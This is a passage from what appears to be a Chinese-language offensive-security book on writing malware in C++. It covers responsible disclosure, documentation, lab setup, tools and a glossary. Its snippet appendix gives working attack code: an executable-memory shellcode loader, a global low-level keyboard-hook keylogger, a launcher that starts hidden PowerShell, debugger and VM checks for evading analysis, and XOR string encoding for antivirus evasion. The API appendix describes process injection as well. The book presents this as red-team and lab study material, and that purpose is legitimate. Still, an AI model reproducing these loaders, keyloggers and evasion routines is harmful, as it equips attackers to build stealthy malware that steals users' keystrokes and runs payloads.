这个等方程式的另一端是披露。如果你发现了一个之前未知的漏洞——可能是在模糊测试（fuzzing）、逆向工程或静态分析期间——你有专业和伦理义务去报告它。这个过程被称为**负责任的披露**。

### 负责任的披露
负责任的披露始于理解你的目标不是宣传，而是保护。你给了受影响方（通常是供应商或项目维护者）一个在细节公开之前修复问题的。从寻找正确的联系方式开始，通常是一个 `security@` 邮箱地址或网站上的表单。保持清晰、尊重且简洁。在适当的情况下包含版本号、复现步骤和有效的概念证明。除非被要求，否则不要发送完整的利用代码，永远不要使用威胁性语言或要求付款，除非你正在参与漏洞赏金计划。

给他们一个合理的时间表也至关重要。许多组织在公开披露之前遵循 90 天或 120 天的窗口，尽管这可能有所不同。有些供应商响应迅速，另一些则保持沉默。如果他们忽略你或驳回了该问题，你最终可能会发布你的发现——但仅是在完成尽职调查并记录每一步之后。

安全披露的一个真实示例是在一个仍在企业环境中使用的遗留应用程序中发现缓冲区溢出。在验证了崩溃并确认其可利用性后，你通知了供应商。他们在两个月后的更新中修复了它，并认可了你的工作，然后你发布了一篇详细说明你的方法和影响的技术文章。这造了社区，保护了用户，并加强了你作为负责任研究人员的声誉。

相比之下，在通知供应商之前在公共论坛上发布零日漏洞面临被立即利用的风险，并危及全球系统。那不是研究——那是鲁莽。

最后，你应该始终对测试活动保留详细日志。这包括 IP 地址、负载哈希值、系统配置、时间戳和任何异常。这些日志在出现问题时可以保护你，并帮助你以后重现问题。更重要的是，它们是专业工作流的一部分，将合规操作者与爱好者区分来。

在这个领域内操作意味着像对待任何任务关键软件一样认真对待你的工作。你的工具可能是攻击性的，但你的心态必须是自律、谨慎且透明的。

## 10.4 文档与透明度的重要性

在进行攻击安全工作时——特别是开发与内存、系统 API 或 shellcode 交互的 `C++` 工具时——文档不仅仅事后考虑。它是维护控制、确保可重复性和展示专业性的关键部分。没有适当的文档，即使是成功的红队行动也可能在评估阶段之后崩溃。糟糕的是，缺乏透明度会让你的工作看起来粗心甚至具有恶意。

良好的文档从你开始构建的那一刻就开始。无论你是在创建一个 shellcode 加载器、编写自定义键盘记录器，还是部署 C2 代理，你都需要记录每个组件的功能、存在的原因以及它在各种条件下的行为。这不仅能帮助他人，还能帮助你避免意外的 Bug 或不安全行为。在这个领域，一个未记录的内存分配或一个模糊的 `Windows API` 调用都可能导致测试环境出现不稳定、被检测或造成不可逆转的损害。

假设你写了一个模块化的恶意软件框架，带有不同的持久化模块、注入机制和外泄程序。如果你不清晰地记录参数、系统调用和依赖项，维护或扩展该项目将成为噩梦。以后，如果有效负载在新目标上执行失败，你将浪费时间尝试逆向工程你自己的意图。如果同事或客户需要审计你的工作，他们将难以理解每个组件的功能，特别是当它为了测试而经过混淆或压缩时。

现在考虑一下在报告结果时，透明度变得多么重要。在一次红队演习或安全评估之后，你可能被要求解释是如何获得访问的、利用了哪些漏洞以及哪些系统受到了影响。如果你的有效负载或操作没有经过良好的记录，报告将显得模糊或不具说服力。相反，详细的日志、带注释的源代码和结构化的技术报告有助于你的客户理解发生了什么以及为什么重要。

透明度对于法律和伦理合规性也至关重要。如果你构建的工具触发了检测事件或被杀毒软件标记，你将需要展示它具体做了什么以及为什么这样做。如果你的工作与合法的安全研究重叠，或者你根据具有严格范围限制的合同进行操作，这一点尤为重要。保留一个包含笔记、图表和提交历史的私有仓库，可以证明你的意图和行为是受控且合法的。

从实践角度来看，一种很好的方法是在你的 `C++` 代码中使用清晰的注释和命名规范包含嵌入文档。例如，如果你正在编写一个在 shellcode 执行之前使用 `XOR` 对字符串进行编码的函数，请精确标记并解释其用例：

```cpp
// XOR 编码 shellcode 字符串以规避杀毒软件

std::string xor_encode(const std::string& input, char key) {
    std::string encoded = input;
    for (size_t i = 0; i < input.size(); ++i)
        encoded[i] ^= key;
    return encoded;
}
```

这告诉读者（以及未来的你）此函数不是随机的——它是规避技术的一部分，其输出在运行时可能会在其他地方解码。

你还可以通过构建模块化日志系统的工具来进一步提高透明度。例如，如果你的恶意软件加载器执行反射性 DLL 注入，将目标进程 ID、时间戳和 DLL 大小记录到内部审计文件中允许追踪工具执行的每一次操作。这不是为了炫耀或展示——而是为了每一行代码和每一次有效负载执行建立链路。

除了代码之外，你的书面文档应该包括架构图、操作流程图和对威胁模型的清晰解释。如果你在 `Active Directory` 环境中模拟钓鱼攻击或横向移动，请写出目标、限制和参与规则。解释部署了哪些工具、如何维护持久化，以及使用了哪些方法规避检测。

现实世界的攻击安全团队通常在行动后发布内部红队报告，其中不仅包括攻击链，还包括缓解建议、C2 活动日志、泄露凭据列表和关键事件的时间戳。这些报告受到信任和重视，因为它们有清晰、透明的文档的支持。





在更广泛的社区中，这种做法鼓励知识共享，而不允许滥用。如果你正在编写公共博客文章或开源工具，透明度有助于确保读者和同行以负责任的方式使用它们。请包含免责声明，明确每个组件的用途，并且在没有强力保护措施的情况下绝不发布完全武器化的载荷。

在这项工作中，你经常会处理模糊了研究与入侵界限的工具。文档是帮助你留在界限右侧的关键。这不仅仅是为了证明你做了什么，更是为了证明你是以负责任的方式完成的。

# 附录

本书的附录提供了额外的参考材料，以支持你的学习、实验和开发。无论你是学习攻击性 `C++ development` 的初学者，还是寻找简洁技术资源的资深从业者，本节都将核心定义、实用工具、社区链接和示例练习汇编在一起。它被设计成一个随手参考，可以在你构建、测试和记录工作时随时查看。

## 附录 A – 恶意软件开发常用的 Windows API

理解和使用 Windows API 对于低级软件开发至关重要，特别是在使用 `C++` 编写载荷、shellcode 封装器、加载器或其他攻击性安全工具时。Windows API 提供了与操作系统核心服务的接口，包括内存管理、进程创建、网络通信和文件处理。在本附录中，我们将详细介绍恶意软件开发中最相关的 API，清晰准确地解释它们的用途、参数和实际用例。

### VirtualAlloc

`VirtualAlloc` API 用于在进程的虚拟地址空间分配内存。在恶意软件开发中，它通常用于在执行前为 shellcode 或载荷预留空间。

函数签名：

```
LPVOID VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
```

- `lpAddress`: 可选。指定分配区域的目标起始地址。
- `dwSize`: 内存区域的大小，单位为字节。
- `flAllocationType`: 标志包括 `MEM_COMMIT` 和 `MEM_RESERVE`。
- `flProtect`: 内存保护。`PAGE_EXECUTE_READWRITE` 允许执行、读取和写入。

用例：为反向 shell 载荷分配内存，使用 `memcpy` 写入，然后使用 `CreateThread` 执行。

### WriteProcessMemory

此 API 将数据写入指定进程地址空间。它通常用于进程注入和反射 DLL 加载。

函数签名：

```
BOOL WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
```

- `hProcess`: 目标进程的句柄。
- `lpBaseAddress`: 目标进程中开始写入的基地址。
- `lpBuffer`: 包含写入数据的缓冲区。
- `nSize`: 写入的字节数。

用例：在使用 `VirtualAllocEx` 在远程进程中分配内存后，使用 `WriteProcessMemory` 注入载荷。

### CreateRemoteThread

用于在另一个进程中启动新线程。与内存分配和载荷写入相结合，该函数实现了远程代码执行。

函数签名：

```
HANDLE CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
```

- `hProcess`: 线程应运行的进程句柄。
- `lpStartAddress`: 目标进程中线程开始执行的地址。
- `lpParameter`: 传递给函数的可选参数。

用例：用于在远程进程中执行 shellcode，例如注入 `explorer`。

### LoadLibrary 和 GetProcAddress

`LoadLibraryA/W` 将 DLL 加载到调用进程的地址空间，而 `GetProcAddress` 从该 DLL 中检索导出函数的地址。

函数签名：

```
HMODULE LoadLibraryA(LPCSTR lpLibFileName);
FARPROC GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
```

用例：用于反射 DLL 注入，其中在载荷内部使用 `LoadLibrary` 加载额外的恶意模块，并使用 `GetProcAddress` 解析载荷所需的特定函数地址。

### EnumProcesses 和 OpenProcess

这些函数用于枚举进程并获取它们的句柄，这在执行注入或侦察时至关重要。

- `EnumProcesses`: 列出所有运行的进程 ID。
- `OpenProcess`: 以指定的访问权限打开进程句柄。

函数签名：

```
HANDLE OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
```

用例：结合使用定位特定进程（如 `explorer.exe` 或 `svchost.exe`）并向其注入代码。

### SetWindowsHookEx

注册钩子函数以监控或修改系统事件，例如击键或鼠标输入。

函数签名：

```
HHOOK SetWindowsHookEx(int idHook, HOOKPROC lpfn, HINSTANCE hMod, DWORD dwThreadId);
```

用例：通过挂钩键盘事件 (`WH_KEYBOARD_LL`) 实现记录器。

### InternetOpen 和 InternetOpenUrl

作为 `WinINet` 库的一部分，这些 API 允许在不需要外部库的情况下进行 HTTP 通信。

- `InternetOpen`: 初始化 `WinINet` 函数。
- `InternetOpenUrl`: 打开 URL 并获取资源句柄。

用例：用于信标（beaconing）、数据外泄或从控制服务器下载二次载荷。

### CreateProcess

创建一个新进程，并允许恶意软件继承句柄或重定向输入输出。通常用于进程空（process hollowing）。

函数签名：

```
BOOL CreateProcess(LPCSTR ApplicationName, LPSTR CommandLine, ...);
```

用例：用于启动 `cmd.exe` 或 `powershell.exe` 等合法二进制文件并注入恶意代码。

### NtQueryInformationProcess

底层 API，常用于规避检测或获取进程及系统的内部信息。

用例：检测进程是否被调试或是否运行在虚拟机/沙箱环境中。

## 附录 B – 黑客实用的 C++ 代码片段

本附录提供了一系列在攻击性安全研究、红队工具开发和渗透测试中常用的 `C++` 代码片段。每个片段都有清晰的解释，帮助你理解其功能、工作原理以及如何对其进行修改以满足目标。这些代码示例侧重于与 Windows API 交互、执行低级系统任务以及编写攻击开发相关的小型工具。

### 分配可执行内存并写入 shellcode

要在内存中执行 shellcode，首先需要分配具有执行权限的内存区域，将载荷拷贝到该区域，然后运行它。以下片段演示了使用 `VirtualAlloc`、`memcpy` 和 `CreateThread` 实现这一过程。

```cpp
#include <windows.h>
#include <iostream>

unsigned char shellcode[] = {
    0x90, 0x90, 0x90, // NOP 或实际的 shellcode
};

int main() {
    void* execMem = VirtualAlloc(nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (execMem == nullptr) {
        std::cerr << "内存分配失败。" << std::endl;
        return 1;
    }

    memcpy(execMem, shellcode, sizeof(shellcode));

    HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)execMem, nullptr, 0, nullptr);

    WaitForSingleObject(hThread, INFINITE);

    return 0;
}
```




这种模式通常用于加载器（loaders）和暂存器（stagers），在这些场景中必须动态写入并执行负载。

## 使用 Windows Hooks 的键盘记录器

基础的键盘记录器可以使用 `SetWindowsHookEx` 函数配合 `WH_KEYBOARD_LL` 钩来实现。这允许你在系统范围内全局捕获按键。

```cpp
#include <windows.h>
#include <fstream>

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        std::ofstream log("keylog.txt", std::ios::app);
        log << (char)kbdStruct->vkCode;
        log.close();
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

int main() {
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, nullptr, 0);
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {}
    UnhookWindowsHookEx(hook);
    return 0;
}
```

此示例会将每个按下的键写入文本文件。为了伦理测试，请仅在隔离的实验室环境中运行此代码。

## 隐默执行命令（LOLBin 示例）

你可以使用 C++ 启动合法的 Windows 二进制文件来间接执行操作——这种策略通常被称为“离地攻击”（Living off the Land）。以下代码会在隐藏窗口启动 `powershell`：

```cpp
#include <windows.h>
int main() {
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    CreateProcess(nullptr, (LPSTR)"powershell -nop -w hidden", nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi);
    return 0;
}
```

此代码可以被修改用于运行任何命令、下载额外的负载或静默执行脚本。

## 检查调试器

反调试技术通常依赖于检查特定的系统标志或使用揭示调试器存在的 API 调用。以下是一个使用 `IsDebuggerPresent` 的代码片段。

```cpp
#include <windows.h>
#include <iostream>

int main() {
    if (IsDebuggerPresent()) {
        std::cout << "Debugger detected!" << std::endl;
        ExitProcess(0);
    }
    std::cout << "Running normally." << std::endl;
    return 0;
}
```

此检查可以嵌入到加载器或 RAT 中，以规避静态或动态检查期间分析。

## 检测虚拟机

攻击者通常希望避免在沙箱或虚拟环境中执行。一种简单的检查方法是查询 BIOS 或注册表以获取已知的虚拟机签名。

```cpp
#include <windows.h>
#include <iostream>
#include <string>

bool isVM() {
    char buffer[128];
    DWORD size = sizeof(buffer);
    if (RegGetValueA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemManufacturer", RRF_RT_REG_SZ, nullptr, &buffer, &size) == ERROR_SUCCESS) {
        std::string manufacturer(buffer);
        if (manufacturer.find("VMware") != std::string::npos || manufacturer.find("VirtualBox") != std::string::npos) {
            return true;
        }
    }
    return false;
}

int main() {
    if (isVM()) {
        std::cout << "Virtual machine detected." << std::endl;
        return 1;
    }
    std::cout << "Physical machine." << std::endl;
    return 0;
}
```

这种逻辑在规避性恶意软件或试图避开蜜罐的红队工具中常见。

这些 C++ 代码片段构成了更复杂的攻击工具的构建组件。它们演示了如何与 Windows API 交互以执行内存执行、输入日志记录、进程创建、反分析和隐术策略等关键操作。与书中介绍的所有技术一样，应严格在实验室环境中使用，或在授权的任务中获得明确许可使用。滥用这些功能可能导致法律和伦理违规，本书的法律与伦理章节将对此详细介绍。

## 附录 C – 恶意软件分析与调试工具

理解恶意软件行为、追踪执行和剖析负载需要可靠的工具。无论是在受控环境中分析可疑二进制文件，还是调试你自己的攻击安全项目，选择正确的工具都至关重要。本附介绍了广泛使用的恶意软件分析和调试工具，并按用途和易用性进行了分类。每个工具都经过清晰的解释，让你了解其设计意图、工作原理以及在现实场景中的用处。

### 静态分析工具

静态分析涉及涉及在不运行程序的情况下检查二进制文件。这有助于你检查反汇编指令、字符串、嵌入资源和文件结构。

- `PE-bear` 是一个轻量级的 Windows 可移植执行文件（PE）查看器。它在清晰且组织的界面中提供头部、节区、导入项和其他元数据的结构化视图。这使得在快速检查 shellcode 加载器、加密存根或自定义壳程序时非常有帮助。
- `Ghidra` 由美国国家安全局（NSA）开发，是一个强大的逆向工程工具。它提供从汇编到伪 C 语言的反编译，这对于理解编译代码中的逻辑很有帮助。它支持使用 `Java` 或 `Python` 脚本，允许自动化重复的分析任务。
- `Cutter` 是 `radare2` 的易用前端，提供了带有整洁 GUI 的二进制分析功能。它允许对函数控制流、字符串引用和调用图进行可视化图表分析，这在追踪恶意软件如何运行运行时至关重要。

### 动态分析工具

动态分析侧重于观察恶意软件在运行时的行为。

- `x64dbg` 是最广泛使用的调试器之一。它是分析原生 Windows 可执行文件、shellcode 负载和进程注入的理想选择。它支持断点、内存检查和插件扩展。
- Sysinternals 的 `Process Monitor (Procmon)` 用于捕捉所有实时文件系统、注册表以及进程/线程活动。在分析持久化机制（如注册表修改或创建计划任务）时，它是必需的。
- `Process Explorer` 同样来自 Sysinternals，允许你监控运行中的进程并识别可疑的句柄、线程和加载的模块。
- `API Monitor` 在你想追踪程序发出的 API 调用时特别有用。这在评估二进制文件与 `VirtualAlloc`、`CreateRemoteThread` 或 `LoadLibrary` 等 API 的交互时至关重要。

### 沙箱与行为分析

- `Any.Run` 是一个基于云的恶意软件交互沙箱。它提供实时进程树可视化、内存快照、释放文件收集以及 MITRE ATT&CK 技术映射。你可以上传二进制文件，观察它在真实系统中的行为，并跟踪注册表项或出站流量等 IOC（入侵入侵指标）。
- `Cuckoo Sandbox` 是一个开源恶意软件分析系统，可以在虚拟环境中自动执行可疑文件。它提供详细的报告，包括截图、文件写入、API 使用和网络连接。你可以使用自定义签名扩展其行为检测能力。

十六进制编辑器与内存查看器

- `HxD` 是一个快速、免费的十六进制编辑器，用于检查二进制数据。在搜索嵌入的 shellcode、解码 XOR 加密的负载或手动修补可执行文件时非常有用。
- 微软的 `WinDbg` 是高级调试器，支持实时内核模式调试、崩溃转储分析和恶意软件根程序检查。它需要更复杂的配置，但对于底层工作非常强大。

### 网络分析工具

- `Wireshark` 捕获并分析网络流量，是恶意软件分析不可或缺的。它允许你检查负载产生的连接、检测数据泄露尝试并识别命令与控制活动。
- `Fakenet-NG` 模拟网络服务（如 `DNS`、`HTTP` 或 `FTP`），使尝试出站通信的恶意软件与受控环境交互。这有助于你在不允许真实出站流量的情况下捕捉意图行为。

### 内存取证





`Volatility` 是一个基于 `Python` 的内存取证工具，可以分析 RAM 内存储以识别恶意进程、注入代码和 `DLLs`。它通常用于在虚拟机中运行恶意软件后，以揭示内存中发生了什么，特别是在进程注入场景下。

`Rekall` 是另一个内存取证框架，具有类似的目标，但插件模型有所不同。在尝试分析无文件恶意软件或后渗透利用行为时，这两种工具都非常有用。

有效的恶意软件分析在于结合多种工具，每种工具都关注特定方面——静态结构、运行时行为、系统影响或网络活动。上述出的工具在专业红队测试和恶意软件研究工作流中都非常成熟。一如既往，请确保在隔离的非生产环境（如虚拟机或沙箱实验室）中使用这些工具，以避免对活跃恶意软件产生意外影响或扩散。

通过学会自信且负责任地使用这些工具，你将能够更好地调查高级威胁、逆向复杂的负载，并在意识到它们可能如何被检测或分析的情况下开发出更具隐蔽性的红队工具。

# 附录 D – 实验环境搭建指南

为了安全地开发、测试和分析恶意软件或红队工具，你需要一个专用的实验室环境。这是一个受控且隔离的空间，允许你对攻击性代码进行实验，而不会危害主操作系统、个人数据或网络。正确设置此环境对于安全和有效至关重要。

## 虚拟化与隔离

安全实验室环境的基础是虚拟化。这意味着使用软件在主机系统内模拟一个或多个机器。流行的虚拟化平台包括 `VMware Workstation`、`VMware Player` 和 `VirtualBox`。这些平台允许你在沙箱环境中运行 `Windows` 或 `Linux` 等客户操作系统。

通过虚拟化，你可以轻松地暂停、拍摄快照、恢复或克隆机器。这在出现问题时（例如恶意软件样本损坏系统）非常有帮助。快照可以让你立即恢复到干净状态。

除非你正在测试特定的网络行为，否则始终禁用虚拟机 `VM` 的互联网访问。如果需要访问互联网，请使用 `host-only` 或 `NAT` 网络模式，并使用 `Wireshark` 或 `Fakenet-NG` 等工具密切监控流量。此外，确保禁用主机与客机系统之间的任何共享文件夹或剪贴板集成，以防止恶意软件逃逸沙箱。

## 测试用操作系统

在你的实验室中，最好安装多个操作系统以模拟真实的目标。`Windows 10` 或 `11` 是必须的，因为大多数恶意软件都是为 `Windows` 设计的。你也可以包含 `Windows 7` 或 `Windows Server` 版本用于旧系统测试。对于红队工具或 C2 基础设施，`Kali Linux`、`Ubuntu` 或 `Parrot OS` 是很好的选择。

必要时使用未授权或评估版本进行测试。`Microsoft` 提供的测试 `ISO` 文件完全适用于临时实验室设置。

让这些系统尽可能接近真实环境。这意味着要安装浏览器、`PDF readers`、`Microsoft Office` 或防病毒程序，就像你在目标机器上找到它们的那样。

## 快照与版本控制

在测试恶意软件或 shellcode 之前，始终为你的虚拟机拍摄一个干净的快照。这让你能够自由地实验并在之后返回基准状态。某些工具可能会修改系统文件、安装持久化机制或导致操作系统完全崩溃。有了快照，你可以探索这些行为，而无需完全重新安装。

维护一组基准快照是一个良好的习惯：
- 安装了所有软件的干净操作系统安装
- 感染后或执行后的快照
- 调试前的快照

这种结构有助于你重复测试或返回已知的良好状态以进行进一步的调试和观察。

## 工具与调试器

在你的客户操作系统中，安装恶意软件开发和分析所需的所有工具。这些可能包括：
- `Visual Studio`（用于 `C++` 开发）
- `x64dbg`、`PE-bear`、`Ghidra`、`Process Monitor`
- `Wireshark`、`Procmon`、`Autoruns`
- `Fakenet-NG`、`Python` 以及 `PowerShell 5/7`
- `Sysinternals Suite`（用于底层 Windows 检测）
- `Netcat`、`Nmap` 和数据包捕工具

如果你正在编写 shellcode，包含 `NASM`、`Keystone` 等工具，并保留一份 `msfvenom` 以备生成负载或对比分析。

## 网络模拟

为了测试通过网络通信的恶意软件，请模拟一个受控的网络环境。这可以包括：
- 本地 `DNS` 服务器（例如 `BIND` 或 `dnsmasq`）用于解析伪域名
- 运行 `Covenant`、`Cobalt Strike` 或自定义 `TCP` 监听器的 C2 服务器
- 使用 `Wireshark` 或 `tcpdump` 等工具监控并记录流量
- 如 `pfSense` 等防火墙模拟企业防御层

如果你正在分析的恶意软件尝试连接互联网，将 `DNS` 查询重定向到你自己的主机。这允许你监控或模拟响应，而不是让样本接触真实的域名。

## 日志记录与监控

使用监控和记录一切的工具配置你的实验室系统——这包括进程执行、注册表更改、文件系统事件和网络包。通过持续捕获数据，你将能够：
- 追踪执行路径
- 理解持久化机制
- 提取入侵指标 (`IOCs`)
- 在执行后重放或可视化行为

诸如 `ApateDNS`、`Procmon` 和 `Sysmon`（来自 `Sysinternals`）等工具提供了系统行为的详细视图。对于内存的深层见解，可以在捕获内存储后使用 `Volatility` 或 `Rekall`。

## 主机注意事项

切勿在你的主机系统上运行未知代码。始终在客户 `VM` 内部运行恶意软件。使用快照，禁用拖放功能，并确保主机的防病毒软件处于且最新。

为了额外的安全，考虑将整个实验室运行在专用物理机或隔离的网络段中。这确保即使恶意软件尝试突破限制，也无法接触生产设备或在线服务。

## 最后建议

你的实验室应该像任何生产系统一样定期更新和维护。保持软件补丁，在修改配置时拍摄新的快照，并记录你的测试设置和观察结果。处理真实的恶意软件（特别是从环境中收集的样本），始终假设你的实验室可能已被入侵。

配置良好的实验室环境可以帮助你安全地探索负载行为、构建红队工具并验证规避技术——同时确保你的数据和生产系统的安全。

# 附录 E – 黑客与 C++ 术语

此术语表作为参考，帮助你快速理解书中使用的术语。无论你是想要加强基础的初学者，还是回顾核心概念的资深开发者，本节都旨在清晰、准确地解释每个概念。

`Access Token`（访问令牌）：Windows 中的一种安全对象，标识用户的权限和组组成。系统使用它来确定进程或线程可以访问哪些资源。

`Address Space Layout Randomization (ASLR)`（地址空间布局随机化）：一种内存保护机制，随机化执行代码、栈、堆和库在内存中的位置。它使得攻击者预测注入代码或函数的位置变得困难。

`API Hooking`（API 钩）：拦截系统或库函数调的技术，以监控或更改其行为。经常被恶意软件和调试工具使用。

`Beaconing`（信标行为）：后门或远程访问工具的一种行为，受感染主机定期联系命令与控制服务器以报告状态或接收指令。





# 术语表

## 缓冲区溢出 (Buffer Overflow)
数据超过缓冲区存储容量的情况，导致相邻内存被覆盖。这是一种常见的软件漏洞，也是漏洞利用的频繁目标。

## 命令与控制 (Command and Control, C2)
攻击者用于与受感染系统通信并对其控制的中心化服务器或基础设施。`C2` 代理是安装在受害者机器上的软件植入。

## 控制流平坦化 (Control Flow Flattening)
一种混淆技术，通过重构代码执行流使其更难以阅读且更难进行逆向工程，同时不改变程序的行为。

## 数据执行保护 (Data Execution Prevention, DEP)
一种安全功能，将某些内存区域标记为不可执行。它通过阻止在数据段中执行注入的 shellcode 能够帮助防止代码注入攻击。

## DLL 注入 (DLL Injection)
强制运行中的进程加载其通常不会使用的动态链接库（`DLL`）的行为。这通常用于恶意软件在另一个进程的上下文中执行恶意代码。

## EDR (终端检测与响应, Endpoint Detection and Response)
高级安全解决方案，用于监控端点的可疑行为，提供实时检测、调查和响应能力。

## 函数指针 (Function Pointer)
存储函数地址的指针。在 `C++` 中，它可以用于在运行时动态调用函数，这在合法软件和恶意载荷中都非常强大。

## 堆喷 (Heap Spraying)
一种技术，用于用精心构造的数据填充堆，以便在发生发生时，控制权会转移到这些数据上。它增加了内存损坏漏洞利用的可靠性。

## 键盘记录器 (Keylogger)
捕获用户输入击的程序或例程，通常在静默且未经许可的情况下运行。用于凭据窃取和监控。

## Metasploit
一个广泛使用的渗透测试框架，包含了用于漏洞利用、载荷和后渗透阶段的模块。它简化了漏洞测试和自动化。

## 助记码 (Opcode)
`CPU` 执行的低级指令代码。在编写或分析 shellcode 时，理解 `opcodes` 是至关重要的。

## 载荷 (Payload)
在利用过程中交付的用于执行特定任务的代码——例如打开反向 shell 或创建新用户账户。它是漏洞利用在获取控制权后运行的部分。

## 多态代码 (Polymorphic Code)
每次运行时都会修改其外观的恶意代码，使得传统的基于签名的防病毒工具难以检测。

## 指针算术 (Pointer Arithmetic)
使用指针变量对内存地址进行的操作。在 `C++` 中，这允许直接操作内存，通常用于低级编程并在漏洞中被利用。

## 反射型 DLL 加载 (Reflective DLL Loading)
一种在不使用 `Windows` 加载器的情况下将 `DLL` 加载到内存的技术。它避免了接触磁盘，通常用于避免检测。

## ROP (返回定向编程, Return-Oriented Programming)
一种高级的漏洞利用技术，通过将合法代码的小片段（称为 `gadgets`）链起来，在不注入新代码的情况下执行恶意操作。

## 沙箱 (Sandbox)
一个隔离的环境，可以在其中执行和监控程序而不影响主机系统。恶意软件通常包含检查机制，以检测其是否运行在沙箱中。

## Shellcode
在漏洞利用中微小的、精心编写的机器码，用于直接在内存中执行载荷。它通常包含汇编指令，并避免空字节以防止破坏基于字符串的注入。

## 阶段器 (Stager)
一种轻量级的初始载荷，用于下载或加载更大的第二阶段载荷。阶段器用于减小载荷尺寸并避免检测。

## 栈金丝雀 (Stack Canary)
一种安全机制，在栈和返回地址等控制数据之间放置一个随机值（`canary`）。如果 `canary` 被修改，程序将检测到缓冲区溢出尝试。

## 释放后用用 (Use-After-Free, UAF)
一种漏洞，在内存被释放后仍进行访问，可能允许攻击者通过操纵重用的内存执行代码或更改程序行为。

## 虚拟内存 (Virtual Memory)
一种内存管理技术，为应用程序提供简化的内存视图，而由 `OS` 在后台处理物理内存。它是进程隔离和执行的核心概念。

## x64dbg
一个用于 `Windows` 应用程序的开源、用户友好调试器。它在逆向工程和恶意软件分析中被广泛使用。

可以在书中的任何时候回顾此术语表以澄清术语。充分理解这些定义很重要，因为它们构成了书中讨论的每个攻击向量、防御机制和 `C++` 技术背后的技术语言。

# 附录 F 推荐阅读和学习资源

为了在基于 C++ 的进攻安全领域建立更深入的知识，不断学习权威书籍、参与实践教程并关注活跃社区很重要。本附录强调了精选的可靠资源，补充了书中介绍的技术和概念。每种资源都是根据其实际相关性、清晰度和当前网络安全实践的匹配程度而出的。

### 书籍

- **Michael Sikorski 和 Andrew Honig 著《Practical Malware Analysis》**：对于任何想要了解恶意软件行为以及如何对其逆向工程的人来说，这是一本基础文本。它涵盖了从静态、动态分析到调试技术的一切，这些与书中恶意软件开发主题密切相关。
- **Jon Erickson 著《Hacking: The Art of Exploitation》**：这本书是学习软件漏洞如何在二进制和汇编级别运作的经典之作。它详细介绍了 `C` 编程概念以及攻击者如何利用这些基础来攻击系统。它的实战方法使其成为非常推荐的辅助资源。
- **Greg Hoglund 和 Jamie Butler 著《Rootkits: Subverting the Windows Kernel》**：如果你对隐蔽恶意软件、内核级操作和高级隐藏技术感兴趣，这本书是可用最好的参考资料之一。它要求具备 `C` 和 `Windows` 内部的深厚背景。
- **Mark Russinovich, David Solomon 和 Alex Ionescu 著《Windows Internals》**：理解 `Windows` 操作系统的底层工作原理对于构建有效的恶意软件和防御措施至关重要。这本书深入探讨了内核、内存管理、线程、进程等。
- **Michael Hale Ligh, Andrew Case, Jamie Levy 和 Aaron Walters 著《The Art of Memory Forensics》**：这本书专注于内存转储和取证信息的分析，对于理解恶意软件如何运行以及如何在内存中检测它非常有价值。

### 在线课程和教程

- **OpenSecurityTraining.info**：该平台提供了关于逆向工程、漏洞开发和恶意软件分析的一些深度技术性的免费培训内容。它们的 `Intro to x86` 和 `Advanced x86` 课程特别有用。
- **Hack The Box 和 TryHackMe**这两个平台都提供了用于学习进攻技术的虚拟实验室。Hack The Box 有更高级的挑战，而 TryHackMe 提供更多引导式学习。使用它们在沙箱环境中应用你的 `C++` 载荷和工具。
- **Malware Unicorn 的 Reverse Engineering Workshop**：这一免费工作坊涵盖了 `IDA`、`x64dbg` 和静态分析技术。对于初学者来说易于上手，对于中级分析师也有价值。
- **Offensive Security 的 Exploit Development 和 Advanced Web Attacks **：OffSec 提供了付费认证，如 `OSED` 和 `OSWE`，提供了深度的实战知识和实验室。如果你想在专业领域展示技能，这些非常有帮助。

### 社区论坛和博客

- **Stack Overflow 和 Stack Exchange Security**：这些是询问 `C++`、`APIs`、安全概念和恶意软件行为特定问题的好地方。





# 社区资源

## Reddit (r/ReverseEngineering, r/netsec, r/AskNetsec)
这些社区经常分享与恶意软件、逆向工程和 C++ 内部相关的工具、研究论文、技术文章和指南。

## GitHub
许多开发者和研究人员会在 GitHub 上发布他们的工具、加载器（loaders）、负载生成器和 shellcode 编码器。学习这些工具是如何构建的，并尝试对其进行修改作为学习练习。

## FireEye, SentinelOne, CrowdStrike 博客
这些公司经常发布非常详细的威胁报告，包括真实的恶意软件攻击案例。这些见解对于学习攻击者方法以及关注现代检测技术非常有帮助。

# 文档与规范

## 微软开发者网络 (MSDN)
这是 Windows API 文档的官方来源。理解 `CreateRemoteThread`、`VirtualAlloc`、`WriteProcessMemory` 等函数的工作原理，对于低级开发至关重要。

## Win32 API 参考
对于在 Windows 上工作的 C++ 开发者来说，这份参考文档是不可缺少的。它为所有系统调用提供了技术规范，包括它们的参数、返回值和错误处理行为。

## C++ 标准文档
参阅 `cppreference.com` 获取关于 C++ 特性、语言结构、标准库和内存处理函数的准确解释。这在编写可移植或高性能代码时尤为有用。

这些资源可以与本书并结合使用，无论你是在搭建实验室、编写你的第一个恶意软件加载器，还是在为红队行动做准备。留住知识的最佳方法是通过实践实践持续地应用它，在安全环境中操作，并跟进不断演变的工具和技术。

